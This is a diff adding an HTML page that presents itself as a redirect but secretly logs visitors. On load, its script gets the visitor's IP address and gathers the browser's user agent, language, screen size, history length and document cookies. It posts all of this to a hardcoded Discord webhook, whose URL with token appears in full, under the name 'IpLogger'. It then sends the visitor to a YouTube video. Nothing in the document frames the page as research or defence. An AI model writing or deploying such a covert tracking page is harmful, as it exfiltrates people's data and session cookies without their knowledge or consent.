@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect...</title>
+</head>
+<body>
+    <h1>Chut t'as rien vu...</h1>
+    <script>
+        function sendMessage(message) {
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1068940672272449629/lShMwYDz043OwowbLgWaOC5nIpYi64eYD0iiB7XmvCBXFDBUMClSQzbPU-AgRBkggAQY");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "IpLogger",
+        avatar_url: "",
+        content: message
+      }
+
+      request.send(JSON.stringify(params));
+      window.location.assign("https://www.youtube.com/watch?v=3BFTio5296w");
+    }
+    </script>
+    <script>
+        var timeOpened = new Date();
+  var timezone= (new Date()).getTimezoneOffset()/60;
+
+  function pageon(){try{return window.location.pathname}catch{return undefined;}}
+  function referrer(){try{return document.referrer}catch{return undefined}}
+  function previousSites(){try{return history.length}catch{return undefined}}
+ 
+  function browserName(){try{return navigator.appName}catch{return undefined}}
+  function browserEngine(){try{return navigator.product}catch{return undefined}}
+  function browserVersion1a(){try{return navigator.appVersion}catch{return undefined}}
+  function browserVersion1b(){try{return navigator.userAgent}catch{return undefined}}
+  function browserLanguage(){try{return navigator.language}catch{return undefined}}
+  function browserOnline(){try{return navigator.onLine}catch{return undefined}}
+  function browserPlatform(){try{return navigator.platform}catch{return undefined}}
+  function javaEnabled(){try{return navigator.javaEnabled()}catch{return undefined}}
+  function dataCookiesEnabled(){try{return navigator.cookieEnabled}catch{return undefined}}
+  function dataCookies1(){try{return document.cookie}catch{return undefined}}
+  function dataCookies2(){try{return decodeURIComponent(document.cookie.split(";"))}catch{return undefined}}
+  function dataStorage(){try{return localStorage}catch{return undefined}}
+
+  function sizeScreenW(){try{return screen.width}catch{return undefined}}
+  function sizeScreenH(){try{return screen.height}catch{return undefined}}
+  function sizeDocW(){try{return document.width}catch{return undefined}}
+  function sizeDocH(){try{return document.height}catch{return undefined}}
+  function sizeInW(){try{return innerWidth}catch{return undefined}}
+  function sizeInH(){try{return innerHeight}catch{return undefined}}
+  function sizeAvailW(){return screen.availWidth}
+  function sizeAvailH(){return screen.availHeight}
+  function scrColorDepth(){return screen.colorDepth}
+  function scrPixelDepth(){return screen.pixelDepth}
+
+  function latitude(){return position.coords.latitude}
+  function longitude(){return position.coords.longitude}
+  function accuracy(){return position.coords.accuracy}
+  function altitude(){return position.coords.altitude}
+  function altitudeAccuracy(){return position.coords.altitudeAccuracy}
+  function heading(){return position.coords.heading}
+  function speed(){return position.coords.speed}
+  function timestamp(){return position.timestamp}
+
+    </script>
+    <script>
+        const getMessage = (ip)=>{
+            return `Hop un nouveau visiteur à tracer: \nip: ${ip}\npageOn: ${pageon()}\n referrer: ${referrer()}\n HistorySize: ${previousSites()}\nBrowserName: ${browserName()}\nBrowserEngine ${browserEngine()}\nBrowserlanguage: ${browserLanguage()}\nAppVersion: ${browserVersion1a()}\nUserAgent: ${browserVersion1b()}\nLangue du navigateur : ${browserLanguage()}\nBrowserplatform: ${browserPlatform()}\nJavascript activé: ${javaEnabled()}\nCookies activés: ${dataCookiesEnabled()}\nDataCookie : ${dataCookies1()}\nDataCookie : ${dataCookies2()}\nScreenWidth: ${sizeScreenW()}\nScreenHeight${sizeScreenH()}`
+        }
+    </script>
+    <script>
+         function getIp(){
+            fetch("https://api.ipify.org/?format=json")
+  .then(response => {
+    // indicates whether the response is successful (status code 200-299) or not
+    if (!response.ok) {
+      throw new Error(`Request failed with status ${reponse.status}`)
+    }
+    return response.json()
+  })
+  .then(data => {
+    var ip = data.ip;
+    sendMessage(getMessage(ip));
+  })
+  .catch(error => console.log(error))
+        }
+    getIp();
+    </script>
+</body>
+</html>
